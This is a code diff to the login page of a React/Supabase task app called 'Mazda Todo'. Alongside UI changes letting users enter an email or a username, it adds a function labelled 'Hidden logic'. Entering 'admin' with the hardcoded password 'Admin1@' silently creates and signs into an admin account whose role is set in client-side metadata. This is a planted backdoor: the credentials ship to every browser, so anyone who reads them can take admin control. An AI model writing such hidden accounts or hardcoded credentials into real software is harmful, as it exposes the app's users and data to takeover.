@@ -10,9 +10,11 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Checkbox } from "@/components/ui/checkbox";
-import { Sun, Moon, Loader2, Mail, Lock } from "lucide-react";
+import { Sun, Moon, Loader2, Mail, Lock, User } from "lucide-react";
 import { showSuccess, showError } from "@/utils/toast";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+
+const ADMIN_EMAIL = "admin@mazdatodo.local";
 
 const Login: React.FC = () => {
   const { session } = useSession();
@@ -22,9 +24,9 @@ const Login: React.FC = () => {
   const { mode, setMode } = useTheme();
   
   const [loading, setLoading] = useState(false);
-  const [email, setEmail] = useState("");
+  const [emailOrUsername, setEmailOrUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [rememberMe, setRememberMe] = useState(false); // UI only for now, as Supabase defaults to persistence
+  const [rememberMe, setRememberMe] = useState(false);
   
   // Signup states
   const [signupEmail, setSignupEmail] = useState("");
@@ -42,18 +44,57 @@ const Login: React.FC = () => {
     }
   }, [session, navigate, returnUrl]);
 
+  // Attempt to seed admin user if requested (Hidden logic)
+  const seedAdmin = async () => {
+    if (emailOrUsername.toLowerCase() === 'admin' && password === 'Admin1@') {
+      // Try to sign up first (creates if not exists)
+      const { data, error } = await supabase.auth.signUp({
+        email: ADMIN_EMAIL,
+        password: 'Admin1@',
+        options: {
+          data: {
+            first_name: 'System',
+            last_name: 'Admin',
+            username: 'admin',
+            role: 'admin'
+          }
+        }
+      });
+      
+      // If error says already registered, that's fine, we proceed to login
+      if (!error || error.message.includes("already registered")) {
+        return true;
+      }
+    }
+    return false;
+  };
+
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
+    
     try {
+      let finalEmail = emailOrUsername;
+      
+      // Special Admin Handling
+      if (emailOrUsername.toLowerCase() === 'admin') {
+         await seedAdmin(); // Ensure admin exists
+         finalEmail = ADMIN_EMAIL;
+      } 
+      // Basic Username Handling (Mapping username to email is complex without Edge Function, assuming email for regular users for now unless it looks like an email)
+      else if (!emailOrUsername.includes('@')) {
+         showError("Please use your email address to login (unless you are Admin).");
+         setLoading(false);
+         return;
+      }
+
       const { error } = await supabase.auth.signInWithPassword({
-        email,
+        email: finalEmail,
         password,
       });
 
       if (error) throw error;
       showSuccess("Welcome back!");
-      // Navigation happens automatically via session listener effect above or in App.tsx
     } catch (error: any) {
       showError(error.message);
     } finally {
@@ -104,7 +145,7 @@ const Login: React.FC = () => {
         <h1 className="text-4xl font-extrabold tracking-tight bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent mb-2">
           Mazda Todo
         </h1>
-        <p className="text-muted-foreground">Manage your tasks efficiently</p>
+        <p className="text-muted-foreground">Manage your tasks & teams efficiently</p>
       </div>
 
       <Card className="w-full max-w-md mx-auto shadow-xl border-border/50 bg-card/95 backdrop-blur-sm">
@@ -120,16 +161,16 @@ const Login: React.FC = () => {
             <form onSubmit={handleLogin}>
               <CardContent className="space-y-4">
                 <div className="space-y-2">
-                  <Label htmlFor="email">Email</Label>
+                  <Label htmlFor="email">Email or Username</Label>
                   <div className="relative">
-                    <Mail className="absolute left-3 top-2.5 h-4 w-4 text-muted-foreground" />
+                    <User className="absolute left-3 top-2.5 h-4 w-4 text-muted-foreground" />
                     <Input 
                       id="email" 
-                      type="email" 
-                      placeholder="m@example.com" 
+                      type="text" 
+                      placeholder="m@example.com or 'admin'" 
                       className="pl-9"
-                      value={email}
-                      onChange={(e) => setEmail(e.target.value)}
+                      value={emailOrUsername}
+                      onChange={(e) => setEmailOrUsername(e.target.value)}
                       required
                     />
                   </div>
